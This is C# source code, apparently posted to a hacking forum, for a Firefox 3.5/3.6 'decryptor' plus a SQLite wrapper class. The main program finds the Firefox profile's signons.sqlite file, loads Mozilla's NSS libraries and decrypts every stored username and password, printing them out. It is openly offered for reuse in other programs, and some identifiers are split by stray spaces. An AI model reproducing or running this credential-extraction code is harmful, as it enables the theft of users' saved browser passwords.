using System;
using System.IO;
using System.Runtime.InteropServices;
using System.Data;
using SQLiteWrapper;
using System.Text;

namespace DarkSelFFDecryptor
{
//Firefox 3.5 and 3.6 Decryptor
//Coded by DarkSel
//Email and MSN: darksel.ltd@live.com
//Websites:
//http://www.hackforums.net
//http://www.leetcoders.org
//Made January 30, 2010

//Credits to CodeProject for the SQLiteWrapper class
//Shouts to Steve, Son1cBl4st, Farhan878, Fenimin, Aeonhack,
//Albertino, JapaBrz, and all the other coders I grew up with!

//If you used this in your program, add me in the credits!

static class FFDecryptor
{
public class SHITEMID
{
public static long cb;
public static byte&#91;] abID;
}
[StructLayout(LayoutKind.Sequential)]
public struct TSECItem
{
public int SECItemType;
public int SECItemData;
public int SECItemLen;
}

[DllImport(&quot;kernel32.dll&quot;)]
private static extern IntPtr LoadLibrary(string dllFilePath);
static IntPtr NSS3;
[DllImport(&quot;kernel32&quot;, CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
[UnmanagedFunctionPointer(CallingConvention.Cdecl)]
public delegate long DLLFunctionDelegate(string configdir);
public static long NSS_Init(string configdir)
{
string MozillaPath = Environment.GetEnvironmentVariable(&quot;PROGRAMFILES&quot;) + @&quot;\Mozilla Firefox\&quot;;
LoadLibrary(MozillaPath + &quot;mozcrt19.dll&quot;);
LoadLibrary(MozillaPath + &quot;nspr4.dll&quot;);
LoadLibrary(MozillaPath + &quot;plc4.dll&quot;);
LoadLibrary(MozillaPath + &quot;plds4.dll&quot;);
LoadLibrary(MozillaPath + &quot;ssutil3.dll&quot;);
LoadLibrary(MozillaPath + &quot;sqlite3.dll&quot;);
LoadLibrary(MozillaPath + &quot;nssutil3.dll&quot;);
LoadLibrary(MozillaPath + &quot;softokn3.dll&quot;);
NSS3 = LoadLibrary(MozillaPath + &quot;nss3.dll&quot;);
IntPtr pProc = GetProcAddress(NSS3, &quot;NSS_Init&quot;);
DLLFunctionDelegate dll = (DLLFunctionDelegate)Marshal.GetDelegateForFunctio nPointer(pProc, typeof(DLLFunctionDelegate));
return dll(configdir);
}
[UnmanagedFunctionPointer(CallingConvention.Cdecl)]
public delegate long DLLFunctionDelegate2();
public static long PK11_GetInternalKeySlot()
{
IntPtr pProc = GetProcAddress(NSS3, &quot;PK11_GetInternalKeySlot&quot;);
DLLFunctionDelegate2 dll = (DLLFunctionDelegate2)Marshal.GetDelegateForFuncti onPointer(pProc, typeof(DLLFunctionDelegate2));
return dll();
}
[UnmanagedFunctionPointer(CallingConvention.Cdecl)]
public delegate long DLLFunctionDelegate3(long slot, bool loadCerts, long wincx);
public static long PK11_Authenticate(long slot, bool loadCerts, long wincx)
{
IntPtr pProc = GetProcAddress(NSS3, &quot;PK11_Authenticate&quot;);
DLLFunctionDelegate3 dll = (DLLFunctionDelegate3)Marshal.GetDelegateForFuncti onPointer(pProc, typeof(DLLFunctionDelegate3));
return dll(slot, loadCerts, wincx);
}
[UnmanagedFunctionPointer(CallingConvention.Cdecl)]
public delegate int DLLFunctionDelegate4(IntPtr arenaOpt,IntPtr outItemOpt, StringBuilder inStr, int inLen);
public static int NSSBase64_DecodeBuffer(IntPtr arenaOpt, IntPtr outItemOpt, StringBuilder inStr, int inLen)
{
IntPtr pProc = GetProcAddress(NSS3, &quot;NSSBase64_DecodeBuffer&quot;);
DLLFunctionDelegate4 dll = (DLLFunctionDelegate4)Marshal.GetDelegateForFuncti onPointer(pProc, typeof(DLLFunctionDelegate4));
return dll(arenaOpt, outItemOpt, inStr, inLen);
}
[UnmanagedFunctionPointer(CallingConvention.Cdecl)]
public delegate int DLLFunctionDelegate5(ref TSECItem data, ref TSECItem result, int cx);
public static int PK11SDR_Decrypt(ref TSECItem data, ref TSECItem result, int cx)
{
IntPtr pProc = GetProcAddress(NSS3, &quot;PK11SDR_Decrypt&quot;);
DLLFunctionDelegate5 dll = (DLLFunctionDelegate5)Marshal.GetDelegateForFuncti onPointer(pProc, typeof(DLLFunctionDelegate5));
return dll(ref data, ref result, cx);
}
//PK11_GetInternalKeySlot

public static string signon;
static void Main(string&#91;] args)
{
Console.Title = &quot;Firefox 3.5 &amp; 3.6 Decryptor&quot;;
Console.WriteLine(&quot;Firefox 3.5 &amp; 3.6 Decryptor in C#&quot;);
Console.WriteLine(&quot;Coded by DarkSel (darksel.ltd@live.com)&quot;);
Console.WriteLine();
bool FoundFile = false;
long KeySlot = 0;
string MozillaPath = Environment.GetEnvironmentVariable(&quot;PROGRAMFILES&quot;) + @&quot;\Mozilla Firefox\&quot;;
string DefaultPath = Environment.GetEnvironmentVariable(&quot;APPDATA&quot;) + @&quot;\Mozilla\Firefox\Profiles&quot;;
string&#91;] Dirs = Directory.GetDirectories(DefaultPath);
foreach (string dir in Dirs)
{
if (!FoundFile)
{
string&#91;] Files = Directory.GetFiles(dir);
foreach (string CurrFile in Files)
{
if (!FoundFile)
{
if (System.Text.RegularExpressions.Regex.IsMatch(Curr File, &quot;signons.sqlite&quot;))
{
NSS_Init(dir);
signon = CurrFile;
}
}

else
{
break;
}
}
}
else
{
break;
}
}

string dataSource = signon;
TSECItem tSec = new TSECItem();
TSECItem tSecDec = new TSECItem();
TSECItem tSecDec2 = new TSECItem();
byte&#91;] bvRet;
SQLiteBase db = new SQLiteBase(dataSource);

DataTable table = db.ExecuteQuery(&quot;SELECT * FROM moz_logins;&quot;);
DataTable table2 = db.ExecuteQuery(&quot;SELECT * FROM moz_disabledHosts;&quot;);
Console.WriteLine(&quot;---Excluded hosts---&quot;);
foreach (DataRow row in table2.Rows)
{
Console.WriteLine(row[&quot;hostname&quot;].ToString());
}
Console.WriteLine();
Console.WriteLine();
KeySlot = PK11_GetInternalKeySlot();
PK11_Authenticate(KeySlot, true, 0);
Console.WriteLine(&quot;---Saved Users &amp; Passwords---&quot;);
foreach (System.Data.DataRow Zeile in table.Rows)
{
string formurl = System.Convert.ToString(Zeile[&quot;formSubmitURL&quot;].ToString());
Console.WriteLine(&quot;URL: &quot; + formurl);
StringBuilder se = new StringBuilder(Zeile[&quot;encryptedUsername&quot;].ToString());
int hi2 = NSSBase64_DecodeBuffer(IntPtr.Zero, IntPtr.Zero, se, se.Length);
TSECItem item = (TSECItem)Marshal.PtrToStructure(new IntPtr(hi2), typeof(TSECItem));
if (PK11SDR_Decrypt(ref item, ref tSecDec, 0) == 0)
{
if (tSecDec.SECItemLen != 0)
{
bvRet = new byte[tSecDec.SECItemLen];
Marshal.Copy(new IntPtr(tSecDec.SECItemData), bvRet, 0, tSecDec.SECItemLen);
Console.WriteLine(&quot;USER: &quot; + System.Text.Encoding.ASCII.GetString(bvRet));
}
}
StringBuilder se2 = new StringBuilder(Zeile[&quot;encryptedPassword&quot;].ToString());
int hi22 = NSSBase64_DecodeBuffer(IntPtr.Zero, IntPtr.Zero, se2, se2.Length);
TSECItem item2 = (TSECItem)Marshal.PtrToStructure(new IntPtr(hi22), typeof(TSECItem));
if (PK11SDR_Decrypt(ref item2, ref tSecDec2, 0) == 0)
{
if (tSecDec2.SECItemLen != 0)
{
bvRet = new byte[tSecDec2.SECItemLen];
Marshal.Copy(new IntPtr(tSecDec2.SECItemData), bvRet, 0, tSecDec2.SECItemLen);
Console.WriteLine(&quot;PASSWORD: &quot; + System.Text.Encoding.ASCII.GetString(bvRet));
}
}
Console.WriteLine();
}
Console.ReadKey();
}

}
}






SQLiteWrapper.cs:


using System;
using System.Collections.Generic;
using System.Text;

using System.Runtime.InteropServices;
using System.Data;
using System.Collections;

namespace SQLiteWrapper
{
//Firefox 3.5 and 3.6 Decryptor
//Coded by DarkSel
//Email and MSN: darksel.ltd@live.com
//Websites:
//http://www.hackforums.net
//http://www.leetcoders.org
//Made January 30, 2010

//Credits to CodeProject for the SQLiteWrapper class
//Shouts to Steve, Son1cBl4st, Farhan878, Fenimin, Aeonhack,
//Albertino, JapaBrz, and all the other coders I grew up with!

//If you used this in your program, add me in the credits!

public class SQLiteBase
{
// imports system functions for work with pointers
[DllImport(&quot;kernel32&quot;)]
private extern static IntPtr HeapAlloc(IntPtr heap, UInt32 flags, UInt32 bytes);

[DllImport(&quot;kernel32&quot;)]
private extern static IntPtr GetProcessHeap();

[DllImport(&quot;kernel32&quot;)]
private extern static int lstrlen(IntPtr str);

// imports SQLite functions
[DllImport(&quot;sqlite3&quot;)]
private static extern int sqlite3_open(IntPtr fileName, out IntPtr database);

[DllImport(&quot;sqlite3&quot;)]
private static extern int sqlite3_close(IntPtr database);

[DllImport(&quot;sqlite3&quot;)]
private static extern int sqlite3_exec(IntPtr database, IntPtr query, IntPtr callback, IntPtr arguments, out IntPtr error);

[DllImport(&quot;sqlite3&quot;)]
private static extern IntPtr sqlite3_errmsg(IntPtr database);

[DllImport(&quot;sqlite3&quot;)]
private static extern int sqlite3_prepare_v2(IntPtr database, IntPtr query, int length, out IntPtr statement, out IntPtr tail);

[DllImport(&quot;sqlite3&quot;)]
private static extern int sqlite3_step(IntPtr statement);

[DllImport(&quot;sqlite3&quot;)]
private static extern int sqlite3_column_count(IntPtr statement);

[DllImport(&quot;sqlite3&quot;)]
private static extern IntPtr sqlite3_column_name(IntPtr statement, int columnNumber);

[DllImport(&quot;sqlite3&quot;)]
private static extern int sqlite3_column_type(IntPtr statement, int columnNumber);

[DllImport(&quot;sqlite3&quot;)]
private static extern int sqlite3_column_int(IntPtr statement, int columnNumber);

[DllImport(&quot;sqlite3&quot;)]
private static extern double sqlite3_column_double(IntPtr statement, int columnNumber);

[DllImport(&quot;sqlite3&quot;)]
private static extern IntPtr sqlite3_column_text(IntPtr statement, int columnNumber);

[DllImport(&quot;sqlite3&quot;)]
private static extern IntPtr sqlite3_column_blob(IntPtr statement, int columnNumber);

[DllImport(&quot;sqlite3&quot;)]
private static extern IntPtr sqlite3_column_table_name(IntPtr statement, int columnNumber);

[DllImport(&quot;sqlite3&quot;)]
private static extern int sqlite3_finalize(IntPtr handle);

// SQLite constants 
private const int SQL_OK = 0;
private const int SQL_ROW = 100;
private const int SQL_DONE = 101;

/// &lt;summary&gt;
/// SQLite data types.
/// &lt;/summary&gt;
public enum SQLiteDataTypes
{
/// &lt;summary&gt;
/// Integer numbers.
/// &lt;/summary&gt;
INT = 1,
/// &lt;summary&gt;
/// Decimal numbers.
/// &lt;/summary&gt;
FLOAT,
/// &lt;summary&gt;
/// All kinds of texts.
/// &lt;/summary&gt;
TEXT,
/// &lt;summary&gt;
/// Blob objects - binary large objects.
/// &lt;/summary&gt;
BLOB,
/// &lt;summary&gt;
/// Nothing.
/// &lt;/summary&gt;
NULL
};

// pointer to database
private IntPtr database;

/// &lt;summary&gt;
/// Creates new instance of SQLiteBase class with no database attached.
/// &lt;/summary&gt;
public SQLiteBase()
{
database = IntPtr.Zero;
}

/// &lt;summary&gt;
/// Creates new instance of SQLiteBase class and opens database with given name.
/// &lt;/summary&gt;
/// &lt;param name=&quot;baseName&quot;&gt;Name (and path) to SQLite database file&lt;/param&gt;
public SQLiteBase(String baseName)
{
OpenDatabase(baseName);
}

/// &lt;summary&gt;
/// Opens database. 
/// &lt;/summary&gt;
/// &lt;param name=&quot;baseName&quot;&gt;Name of database file&lt;/param&gt;
public void OpenDatabase(String baseName)
{
// opens database 
if (sqlite3_open(StringToPointer(baseName), out database) != SQL_OK)
{
// if there is some error, database pointer is set to 0 and exception is throws
database = IntPtr.Zero;
throw new Exception(&quot;Error with opening database &quot; + baseName + &quot;!&quot;);
}
}

/// &lt;summary&gt;
/// Closes opened database.
/// &lt;/summary&gt;
public void CloseDatabase()
{
// closes the database if there is one opened
if (database != IntPtr.Zero)
{
sqlite3_close(database);
}
}

/// &lt;summary&gt;
/// Returns the list of tables in opened database.
/// &lt;/summary&gt;
/// &lt;returns&gt;&lt;/returns&gt;
public ArrayList GetTables()
{
// executes query that select names of all tables and views in master table of every database
String query = &quot;SELECT name FROM sqlite_master &quot; +
&quot;WHERE type IN (&#39;table&#39;,&#39;view&#39;) AND name NOT LIKE &#39;sqlite_%&#39;&quot; +
&quot;UNION ALL &quot; +
&quot;SELECT name FROM sqlite_temp_master &quot; +
&quot;WHERE type IN (&#39;table&#39;,&#39;view&#39;) &quot; +
&quot;ORDER BY 1&quot;;
DataTable table = ExecuteQuery(query);

// when table is generater, it writes all table names in list that is returned
ArrayList list = new ArrayList();
foreach (DataRow row in table.Rows)
{
list.Add(row.ItemArray[0].ToString());
}
return list;
}

/// &lt;summary&gt;
/// Executes query that does not return anything (e.g. UPDATE, INSERT, DELETE).
/// &lt;/summary&gt;
/// &lt;param name=&quot;query&quot;&gt;&lt;/param&gt;
public void ExecuteNonQuery(String query)
{
// calles SQLite function that executes non-query
IntPtr error;
sqlite3_exec(database, StringToPointer(query), IntPtr.Zero, IntPtr.Zero, out error);
// if there is error, excetion is thrown
if (error != IntPtr.Zero)
throw new Exception(&quot;Error with executing non-query: \&quot;&quot; + query + &quot;\&quot;!\n&quot; + PointerToString(sqlite3_errmsg(error)));
}

/// &lt;summary&gt;
/// Executes query that does return something (e.g. SELECT).
/// &lt;/summary&gt;
/// &lt;param name=&quot;query&quot;&gt;&lt;/param&gt;
/// &lt;returns&gt;&lt;/returns&gt;
public DataTable ExecuteQuery(String query)
{
// processed query
IntPtr statement;

// excess data, it has no use
IntPtr excessData;

// process query and make statement
sqlite3_prepare_v2(database, StringToPointer(query), GetPointerLenght(StringToPointer(query)), out statement, out excessData);

// table for result of function
DataTable table = new DataTable();

// reads first row - it is different from next rows because it also creates table columns
// result - returns SLQ_ROW while there is next row
int result = ReadFirstRow(statement, ref table);

// reads rows
while (result == SQL_ROW)
{
result = ReadNextRow(statement, ref table);
}

// finalize executing this query
sqlite3_finalize(statement);

// returns table
return table;
}

// private function for reading firs row and creating DataTable
private int ReadFirstRow(IntPtr statement, ref DataTable table)
{
// create new instance of DataTable with name &quot;resultTable&quot;
table = new DataTable(&quot;resultTable&quot;);

// evaluates statement 
int resultType = sqlite3_step(statement);

// if result of statement is SQL_ROW, create new table and write row in it
if (resultType == SQL_ROW)
{
// returns number of columns returned by statement
int columnCount = sqlite3_column_count(statement);

// declartaion of variables for reading first row
String columnName = &quot;&quot;;
int columnType = 0;
object&#91;] columnValues = new object[columnCount];

// reads columns one by one
for (int i = 0; i &lt; columnCount; i++)
{
// returns the name of current column
columnName = PointerToString(sqlite3_column_name(statement, i));

// returns the type of current column
columnType = sqlite3_column_type(statement, i);

// checks type of columns - neccessary because different functions are required for different types
switch (columnType)
{
// in case of integer column
case (int)SQLiteDataTypes.INT:
{
// adds new integer column to table
table.Columns.Add(columnName, Type.GetType(&quot;System.Int32&quot;));

// writes column value in object array
columnValues[i] = sqlite3_column_int(statement, i);
break;
}
// same as for integer, this one is for float
case (int)SQLiteDataTypes.FLOAT:
{
table.Columns.Add(columnName, Type.GetType(&quot;System.Single&quot;));
columnValues[i] = sqlite3_column_double(statement, i);
break;
}
// ... for text
case (int)SQLiteDataTypes.TEXT:
{
table.Columns.Add(columnName, Type.GetType(&quot;System.String&quot;));
columnValues[i] = PointerToString(sqlite3_column_text(statement, i));
break;
}
// ... for blob - blob are written in table as strings!!
case (int)SQLiteDataTypes.BLOB:
{
table.Columns.Add(columnName, Type.GetType(&quot;System.String&quot;));
columnValues[i] = PointerToString(sqlite3_column_blob(statement, i));
break;
}
// in case of something other, value is read as string
default:
{
table.Columns.Add(columnName, Type.GetType(&quot;System.String&quot;));
columnValues[i] = &quot;&quot;;
break;
}
}
}

// writes column values to table
table.Rows.Add(columnValues);
}

// evalute statemnet for next results
return sqlite3_step(statement);
}

// private function for reading rows other than first
// it&#39; same like first row, only without creating table and columns
private int ReadNextRow(IntPtr statement, ref DataTable table)
{
int columnCount = sqlite3_column_count(statement);

int columnType = 0;
object&#91;] columnValues = new object[columnCount];

for (int i = 0; i &lt; columnCount; i++)
{
columnType = sqlite3_column_type(statement, i);

switch (columnType)
{
case (int)SQLiteDataTypes.INT:
{
columnValues[i] = sqlite3_column_int(statement, i);
break;
}
case (int)SQLiteDataTypes.FLOAT:
{
columnValues[i] = sqlite3_column_double(statement, i);
break;
}
case (int)SQLiteDataTypes.TEXT:
{
columnValues[i] = PointerToString(sqlite3_column_text(statement, i));
break;
}
case (int)SQLiteDataTypes.BLOB:
{
columnValues[i] = PointerToString(sqlite3_column_blob(statement, i));
break;
}
default:
{
columnValues[i] = &quot;&quot;;
break;
}
}
}
table.Rows.Add(columnValues);
return sqlite3_step(statement);
}

// converts string to pointer
private IntPtr StringToPointer(String str)
{
// if string is null, pointer is 0
if (str == null)
{
return IntPtr.Zero;
}
else
{
// else, convert it to pointer
Encoding encoding = Encoding.UTF8;
Byte&#91;] bytes = encoding.GetBytes(str);
int length = bytes.Length + 1;
IntPtr pointer = HeapAlloc(GetProcessHeap(), 0, (UInt32)length);
Marshal.Copy(bytes, 0, pointer, bytes.Length);
Marshal.WriteByte(pointer, bytes.Length, 0);
return pointer;
}
}

// convert pointer to string
private String PointerToString(IntPtr ptr)
{
if (ptr == IntPtr.Zero)
return null;

Encoding encoding = Encoding.UTF8;

int length = GetPointerLenght(ptr);
Byte&#91;] bytes = new Byte[length];
Marshal.Copy(ptr, bytes, 0, length);
return encoding.GetString(bytes, 0, length);
}

// returns length of pointer
private int GetPointerLenght(IntPtr ptr)
{
if (ptr == IntPtr.Zero)
return 0;
return lstrlen(ptr);
}
}
}